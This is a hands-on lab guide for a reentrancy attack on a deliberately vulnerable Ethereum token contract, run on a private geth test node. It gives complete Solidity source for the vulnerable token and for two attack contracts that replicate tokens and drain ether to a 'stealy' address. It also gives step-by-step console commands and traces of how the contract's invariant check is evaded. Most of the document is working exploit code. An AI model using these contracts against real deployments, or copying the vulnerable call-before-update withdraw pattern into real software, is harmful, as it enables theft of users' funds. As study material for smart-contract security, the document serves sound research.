# Accounts

```
coinbase address:     0xc96aaa54e2d44c299564da76e1cd3184a2386b8d
coinbase private key: 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef

stealy address:       0x7057d488a44a3795993412a6c00deac60907f78c
stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea
```

# Instructions to carry out the hack

Requirement: geth v1.4.10 or greater

First have a good look at the contracts in `contracts/` directory.

Then, from the command line run

    $ ./mining-node.sh

This starts a _fresh_ private Ethereum node that also mines.
There are two accounts `creator` and `stealy`. `creator` does the mining and racks up 1000s of
ether in minutes. Running it again will recreate the node from scratch, deleting all old blocks.
The blockchain will go in directory `geth-data/`.

Once it is up and running run the following in a new terminal:

    $ ./attach.sh

This opens a geth console and we can get started. For the following part, cut and paste each
block and wait for various things (such as mining to occur) before cutting and pasting in the
following block. Let's start with this block which just sets up a few useful variables and
functions, and unlocks the two accounts.

    var weiInEther = 1000000000000000000;
    var weiInSzabo = 1000000000000;
    var creator  = web3.eth.accounts[0];
    var stealy   = web3.eth.accounts[1];

    // Utility function to see how many szabo are at an address
    var szaboOf = function(address) { return web3.fromWei(web3.eth.getBalance(address), "szabo"); };

    personal.unlockAccount(creator,  "test", 10000); // for many hours
    personal.unlockAccount(stealy,   "test", 10000); // for many hours

    var numTokens = 10; // the number of tokens we will be replicating in the attack
    var numExtraWithdraws = 15; // the number of times we will replicate the tokens


Wait until unlocks

    // Let Stealy have a little bit of ether to play around with
    web3.eth.sendTransaction({from: creator, to: stealy, value: ((numTokens+1)*weiInSzabo) });

    var contractNotifier = function(e, contract){
        if(!e) {

          if(!contract.address) {
            console.log("Contract transaction send: TransactionHash: " + contract.transactionHash + " waiting to be mined...");

          } else {
            console.log("Contract mined! Address: " + contract.address);
            console.log(contract);
          }

        } else {
          console.log(e);
        }
    };


    var twiSource =  'contract TokenWithInvariants {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;   /* 1 token = 1 szabo */   uint public conversion = 1 szabo;    modifier checkInvariants {  _     if (this.balance/conversion < totalSupply) throw;   }    /* intentionally vulnerable */   function deposit(uint amount) checkInvariants {     Log("deposit", msg.sender, 0x0, amount);     /* Throw if not enough value has been sent to "buy" token */     if (msg.value / conversion < amount) throw;     balanceOf[msg.sender] += amount;     totalSupply += amount;   }    function transfer(address to, uint value) checkInvariants {     Log("transfer", msg.sender, to, value);     if (balanceOf[msg.sender] >= value) {       balanceOf[to] += value;       balanceOf[msg.sender] -= value;     }   }    /* intentionally vulnerable */   function withdraw() checkInvariants {     uint balance = balanceOf[msg.sender];     Log("withdraw", 0x0, msg.sender, balance);     if (msg.sender.call.value(balance*conversion)()) {       totalSupply -= balance;       balanceOf[msg.sender] = 0;     }   } }';


    var twiCompiled = web3.eth.compile.solidity(twiSource);
    var twiContract = web3.eth.contract(twiCompiled.TokenWithInvariants.info.abiDefinition);

    var twi = twiContract.new({from: creator, data: twiCompiled.TokenWithInvariants.code, gas: 1000000, gasPrice: 1}, contractNotifier);

Wait for mining

    // Send a lot of ether to the TokenWithInvariants contract from creator
    // We're not going to exploit a contract for chicken feed!
    twi.deposit(1000, { from: creator,  gas: 1000000, gasPrice: 1, value: (1000*weiInSzabo)});

    var twiLog = twi.Log().watch(function(err, result) {
      var a = result.args;
      if (err) { console.log(err); return; }
      console.log(a.msg, a.from, a.to, a.value);
    });

Getting ready for our attack run


    // First compile the RaceToEmpty contract (the second part of our attack)

    var r2eSource = '/* The proxy contract is required to declare an interface    that RaceToEmpty understands */ contract TWIProxy {   mapping(address => uint) public balanceOf;   uint public totalSupply;    function withdraw() {   }  }   /*  * This contract is used in conjunction with PrepWithdraws.  * The target of PrepWithdraws should be this contract.  * Once "start" has been called on PrepWithDraws call this  * contract in order to withdraw that many times  * a get the ether value equal to the total number of tokens  * withdrawn.  */ contract RaceToEmpty {   event Log(string msg, uint value);   /* It is important that performAttack is initially false so    * that we can give ether to this contract to deposit into    * TokenWithInvariants contract without invoking logic of    * the default function    */   bool performAttack = false;   uint8 depth = 0;   uint numExtraWithdraws;   /* Fill in with address of TokenWithInvariants contract */   TWIProxy twi;   address stealAddress;    /* Constructor */   function RaceToEmpty(address _twiAddress, address _stealAddress,                          uint _numExtraWithdraws) {     twi = TWIProxy(_twiAddress);     stealAddress = _stealAddress;     numExtraWithdraws   = _numExtraWithdraws;   }    /* Default function. Always run */   function() {     if (performAttack) {       depth = depth + 1;       if (depth <= numExtraWithdraws) {  /* attack again */         Log("Extra withdraw number ", depth);         twi.withdraw();       } else {         Log("Finished", 0);         /* Send all value to stealAddress */         stealAddress.call.value(this.balance)();         performAttack = false; /* turn off attack again*/       }     }   }    function reset() {     performAttack = false;   }    function start() {     depth = 0;     performAttack = true;     Log("First withdraw. Tokens = ", twi.balanceOf(this));     twi.withdraw();   }  }';

    var r2eCompiled = web3.eth.compile.solidity(r2eSource);
    var r2eContract = web3.eth.contract(r2eCompiled.RaceToEmpty.info.abiDefinition);

    var raceToEmpty = r2eContract.new(twi.address, stealy, numExtraWithdraws, { from: stealy, data: r2eCompiled.RaceToEmpty.code, gas: 1000000, gasPrice: 1}, contractNotifier);

Wait for the raceToEmpty contract to be mined

    // Set up logging for raceToEmpty

    var r2eLog = raceToEmpty.Log().watch(function(err, result) {
      var a = result.args;
      if (err) { console.log(err); return; }
      console.log(a.msg, a.value);
    });


    // Now compile the PrepWithdraws contract

    var prepWithdrawsSource = '/* The proxy contract is required to declare an interface    that PrepWithdraws understands */ contract TWIProxy {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;    function transfer(address to, uint value) {   }    function deposit(uint amount) {   }    function withdraw() {   }  }   /*  * This contract is used to modify an instance of the TokenWithInvariants  * contract in such a way that another contract, RaceToEmpty, can  * withdraw multiple times.  *  * numTokens is the number of tokens you wish to replicate  * numExtraWithDraws is the number of extra times you wish to withdraw it  * from the RaceToEmpty contract  */ contract PrepWithdraws {   event Log(string msg, uint value);   /* It is important that performAttack is initially false so    * that we can give ether to this contract to deposit into    * TokenWithInvariants contract without invoking logic of    * the default function    */   bool performAttack = false;   uint8 depth = 0;   uint constant conversion = 1 szabo;   uint numExtraWithdraws = 1;   /* Fill in with address of TokenWithInvariants contract */   TWIProxy twi;   address raceToEmptyAddress;   uint8 numTokens;   uint tokensInWei;    /* Constructor */   function PrepWithdraws(address _twiAddress, address _raceToEmptyAddress,                          uint8 _numTokens, uint _numExtraWithdraws) {     twi = TWIProxy(_twiAddress);     raceToEmptyAddress = _raceToEmptyAddress;     numTokens    = _numTokens;     numExtraWithdraws   = _numExtraWithdraws;     tokensInWei  = numTokens * conversion;   }    /* Default function. Always run */   function() {     if (performAttack) {       depth = depth + 1;       Log("value:", (uint)(this.balance/conversion));       if (depth < numExtraWithdraws) {  /* attack again */         twi.withdraw();       } else {         Log("Transferring tokens", numTokens);         twi.transfer.value(numExtraWithdraws*tokensInWei)(raceToEmptyAddress,numTokens);         performAttack = false; /* turn off attack again*/       }     }   }    function reset() {     performAttack = false;   }    function start() {     depth = 0;     performAttack = true;     /* Contract itself must have some funds to make deposit*/     twi.deposit.value(tokensInWei)(numTokens);     twi.withdraw();   }  }';


    var prepWithdrawsCompiled = web3.eth.compile.solidity(prepWithdrawsSource);
    var prepWithdrawsContract = web3.eth.contract(prepWithdrawsCompiled.PrepWithdraws.info.abiDefinition);


    var prepWithdraws = prepWithdrawsContract.new(twi.address, raceToEmpty.address, numTokens, numExtraWithdraws, { from: stealy, data: prepWithdrawsCompiled.PrepWithdraws.code, gas: 1000000, gasPrice: 1}, contractNotifier);

Wait for mining

    var ppwLog = prepWithdraws.Log().watch(function(err, result) {
      var a = result.args;
      if (err) { console.log(err); return; }
      console.log(a.msg, a.value);
    });


    // Give an initial amount to the attack contract. This value must be equal to
    // numTokens tokens worth of ether. The attack will not work without it!
    web3.eth.sendTransaction({from: stealy, to: prepWithdraws.address, value: numTokens*weiInSzabo, gas: 1000000, gasPrice: 1 });

    var checkState = function() {
      console.log("TWI total supply:", twi.totalSupply(), "balanceOf(prepWithdraws):", twi.balanceOf(prepWithdraws.address), "balanceOf(raceToEmpty):", twi.balanceOf(raceToEmpty.address));
      console.log("TWI value:", szaboOf(twi.address), "prepWithdraws value:", szaboOf(prepWithdraws.address), "stealy value:", szaboOf(stealy));
    };

Wait just a few seconds:

    // Check previous state
    checkState();

Check that `prepWithdraws value` is equal to `numTokens`
OMG, ready for the attack! Let's do it!

    prepWithdraws.start({ from: stealy, gas: 10000000, gasPrice: 1});

Wait until finished. You will see a bunch of log messages come up.

    checkState();

Interesting, huh? The TWI total supply should be equal to `1000 - (numExtraWithdraws - 1 )* numTokens`.
The TWI value should be `1000 + numTokens`. Now run the second part of the attack:

    raceToEmpty.start({ from: stealy, gas: 10000000, gasPrice: 1});

Wait until finished. Now check final balances

    checkState();

If all was successful then "stealy value" should be greater than before by
`(numTokens + 1) * numExtraWithdraws`

# Oddities

Consider this:

    twi.deposit(1, { from: attacker, gasPrice: 1 })

The last argument is a bit odd. The deposit function has only one parameter yet I have given it two.
It seems that all methods accept an extra argument where you can add a hash with a "from" address
and other options too. Be sure to set a low gasPrice!

I haven't yet found the Ethereum documentation that tells you this.

`eth.getStorageAt` is great, but if you want to be able to use it properly then you need to read
this: http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage


# Open mystery


SHA3 hashes are different for web3.sha3 and Solidity. I don't know why.

Solidity (SHA3 is done on a 32 byte string)

     SHA3("000000000000000000000000c96aaa54e2d44c299564da76e1cd3184a2386b8d") = bffc6a0b3a5962d974bf2aa352cab76f811201252c0b157f76aa2afbadba93dd

Web3

     web3.sha3(web3.toAscii("000000000000000000000000c96aaa54e2d44c299564da76e1cd3184a2386b8d")) = "0x7109b3ece3a79d6b288bfab44ac073c2c2cf4e93fc1745799cb0772a623182cf"


# Faux stack traces

I used these to work out how the hack worked.

Shorthand:

- value       = ether balance of contract in szabos
- totalSupply = uint variable of TWI contract
- P.val       = ether balance of prepWithdraws in szabos
- P           = balanceOf[prepWithdraws.address]
- R           = balanceOf[raceToEmpty]

```
  value    | totalSupply |P.val|  P  | R | Ops                 | Trace
-----------+-------------+-----+-----+---+---------------------+-------------------------------------
  1000        1000          2     0    0  [value+2,P.val-2]    | P: twi.deposit.value(2)(2)
  1002        1000          0     0    0  [P+2]                |   TWI: balanceOf[P] += amount
  1002        1000          0     2    0  [totalSupply+2]      |   TWI: totalSupply += amount
  1002        1002          0     2    0  []                   |   TWI: checkInvariants() // suceeds
  1002        1002          0     2    0  []                   | P: twi.withdraw
  1002        1002          0     2    0  []                   |   TWI: balance = balanceOf[P]    (== 2)
  1002        1002          0     2    0  [value-2,P.val+2]    |   TWI: A.call.value(balance)()
  1000        1002          2     2    0  []                   |     P: twi.withdraw()
  1000        1002          2     2    0  []                   |       TWI: balance = balanceOf[P]  (==2)
  1000        1002          2     2    0  [value-2,P.val+2]    |       TWI: A.call.value(balance)()
   998        1002          4     2    0  [value+4,P.val-4]    |         P: twi.transfer.value(4)(raceToEmpty, 2)
  1002        1002          0     2    0  [R+2]                |           TWI: balanceOf[R] += value
  1002        1002          0     2    2  [P-2]                |           TWI: balanceOf[P] -= value
  1002        1002          0     0    2  []                   |           TWI: checkInvariants() // suceeds
  1002        1002          0     0    2  []                   |         P: return
  1002        1002          0     0    2  [totalSupply-2]      |       TWI: totalSupply -= balance
  1002        1000          0     0    2  [P=0]                |       TWI: balanceOf[P] = 0 (does nothing)
  1002        1000          0     0    2  []                   |       TWI: checkInvariants
  1002        1000          0     0    2  [totalSupply-2]      |   TWI: totalSupply -= balance
  1002         998          0     0    2  [P=0]                |   TWI: balanceOf[P] = 0 (does nothing)
  1002         998          0     0    2  []                   |   TWI: checkInvariants  // succeeds
  1002         998          0     0    2
```

This is just the beginning. Now we need to perform a "race to empty" using S as a contract.

```
value    | totalSupply |R.val|  R | Ops                    | Trace
---------+-------------+-----+----+------------------------+-------------------
 1002         998         0     2    []                    | R: twi.withdraw()
 1002         998         0     2    []                    |   TWI: balance = balanceOf[R]    // balance == 2
 1002         998         0     2    [value-2, R.val+2]    |   TWI: S.call.value(balance)()
 1000         998         2     2    []                    |     R: twi.withdraw()
 1000         998         2     2    []                    |       TWI: balance = balanceOf[R] // balance = 2
 1000         998         2     2    [value-2, R.val+2]    |       TWI: A.call.value(balance)()
  998         998         4     2    []                    |         R: return
  998         998         4     2    [totalSupply-2]       |       TWI: totalSupply -= balance
  998         996         4     2    [R = 0]               |       TWI: balanceOf[R] = 0
  998         996         4     0    []                    |       TWI: checkInvariants()  // succeeds
  998         996         4     0    []                    |     R: return
  998         996         4     0    [totalSupply-2]       |   TWI: totalSupply -= balance
  998         994         4     0    [R=0]                 |   TWI: balanceOf[R] = 0  // does nothing
  998         994         4     0    []                    |   TWI: checkInvariants // succeeds
  998         994         4     0
```

This is nice, but I wonder if you could recursively call this many, many times and just keep
getting value out...

```
value    | totalSupply |R.val|  R | Ops                    | Trace
---------+-------------+-----+----+------------------------+-------------------
 1002         998         0     2    []                    | R: twi.withdraw()
 1002         998         0     2    []                    |   TWI: balance = balanceOf[R]    // balance == 2
 1002         998         0     2    [value-2, R.val+2]    |   TWI: S.call.value(balance)()
 1000         998         2     2    []                    |     R: twi.withdraw()
 1000         998         2     2    []                    |       TWI: balance = balanceOf[R] // balance = 2
 1000         998         2     2    [value-2, R.val+2]    |       TWI: S.call.value(balance)()
  998         998         4     2    []                    |         R: twi.withdraw()
  998         998         4     2    []                    |           TWI: balance = balanceOf[R] // balance = 2
  998         998         4     2    [value-2, R.val+2]    |           TWI: S.call.value(balance)()
  996         998         6     2    []                    |             R: return
  996         998         6     2    [totalSupply-2]       |           TWI: totalSupply -= balance
  996         996         6     2    [R=0]                 |           TWI: balanceOf[R] = 0
  996         996         6     0    []                    |           TWI: checkInvariants() // succeeds... JUST (wouldn't succeed if you did another recursive call)
... rest omitted ...
```

The answer is no. The maximum withdraw is triple.

Is a short original attack possible?

```
  value    | totalSupply |P.val|  P  | R | Ops                 | Trace
-----------+-------------+-----+-----+---+---------------------+-------------------------------------
  1000        1000          2     0    0  [value+2,P.val-2]    | P: twi.deposit.value(2)(2)
  1002        1000          0     0    0  [P+2]                |   TWI: balanceOf[P] += amount
  1002        1000          0     2    0  [totalSupply+2]      |   TWI: totalSupply += amount
  1002        1002          0     2    0  []                   |   TWI: checkInvariants() // suceeds
  1002        1002          0     2    0  []                   | P: twi.withdraw
  1002        1002          0     2    0  []                   |   TWI: balance = balanceOf[P]    (== 2)
  1002        1002          0     2    0  [value-2,P.val+2]    |   TWI: A.call.value(balance)()
  1000        1002          2     2    0  [value+2]            |     A.transfer.value(2)(raceToEmpty,2)
  1002        1002          0     2    0  [R+2]                |       TWI: balanceOf[R] += value
  1002        1002          0     2    2  [P-2]                |       TWI: balanceOf[P] -= value
  1002        1002          0     0    2  []                   |       TWI: checkInvariants() // succeeds
  1002        1002          0     0    2  []                   |     P: return
  1002        1002          0     0    2  [totalSupply-2]      |   TWI: totalSupply -= balance
  1002        1000          0     0    2  [P=0]                |   TWI: balanceOf[P] = 0 // does nothing
  1002        1000          0     0    2  []                   |   TWI: checkInvariants // succeeds
  1002        1000          0     0    2
```

Hmmm, not nearly as good but it still works. Should allow a double withdraw.

Using all this data I'd like to make the following conjecture:

    number of withdraws possible = total withdraw calls + 1

Let's look at 3 withdraw calls before transfer

```
  value    | totalSupply |P.val|  P  | R | Ops                 | Trace
-----------+-------------+-----+-----+---+---------------------+-------------------------------------
  1000        1000          2     0    0  [value+2,P.val-2]    | P: twi.deposit.value(2)(2)
  1002        1000          0     0    0  [A+2]                |   TWI: balanceOf[P] += amount
  1002        1000          0     2    0  [totalSupply+2]      |   TWI: totalSupply += amount
  1002        1002          0     2    0  []                   |   TWI: checkInvariants() // suceeds
  1002        1002          0     2    0  []                   | P: twi.withdraw
  1002        1002          0     2    0  []                   |   TWI: balance = balanceOf[P]    // == 2
  1002        1002          0     2    0  [value-2,P.val+2]    |   TWI: A.call.value(balance)()
  1000        1002          2     2    0  []                   |     P: twi.withdraw()
  1000        1002          2     2    0  []                   |       TWI: balance = balanceOf[P]  // ==2
  1000        1002          2     2    0  [value-2,P.val+2]    |       TWI: A.call.value(balance)()
   998        1002          4     2    0  []                   |         P: twi.withdraw()
   998        1002          4     2    0  []                   |           TWI: balance = balanceOf[P] // == 2
   998        1002          4     2    0  [value-2,P.val+2]    |           TWI: A.call.value(balance)()
   996        1002          6     2    0  [value+6]            |             A.transfer.value(6)(raceToEmpty, 2)
  1002        1002          0     2    0  [R+2]                |               TWI: balanceOf[R] += value
  1002        1002          0     2    2  [P-2]                |               TWI: balanceOf[P] -= value
  1002        1002          0     0    2  []                   |               TWI: checkInvariants() // succeeds
  1002        1002          0     0    2  []                   |             P: return
  1002        1002          0     0    2  [totalSupply-2]      |           TWI: totalSupply -= balance
  1002        1000          0     0    2  [P=0]                |           TWI: balanceOf[P] = 0 // does nothing
  1002        1000          0     0    2  []                   |           TWI: checkInvariants() // succeeds
  1002        1000          0     0    2  []                   |         P: return
  1002        1000          0     0    2  [totalSupply-2]      |       TWI: totalSupply -= balance
  1002         998          0     0    2  [P=0]                |       TWI: balanceOf[P] = 0 // does nothing
  1002         998          0     0    2  []                   |       TWI: checkInvariants() // succeeds
  1002         998          0     0    2  []                   |     P: return
  1002         998          0     0    2  [totalSupply-2]      |   TWI: totalSupply -= balance
  1002         996          0     0    2  [P=0]                |   TWI: balanceOf[P] = 0 // does nothing
  1002         996          0     0    2  []                   |   TWI: checkInvariants() // succeeds
  1002         996          0     0    2
```

The differential between `totalSupply` and `value` is now even larger, allowing us to withdraw 4
times using the S contract!


# Blog post notes

(if I ever write one)

- You need to send value along with a "deposit" call. Exchange rate is 1 token = 1 szabo. Otherwise
  the transaction fails.


## Lessons learned

- You thought there was a gas bug when things weren't working. You thought that perhaps
  log messages used too much gas. This was not the case. It was the invariant checking that
  threw you off

- Doing traces like in the original github code base is the way to go when trying to exploit.


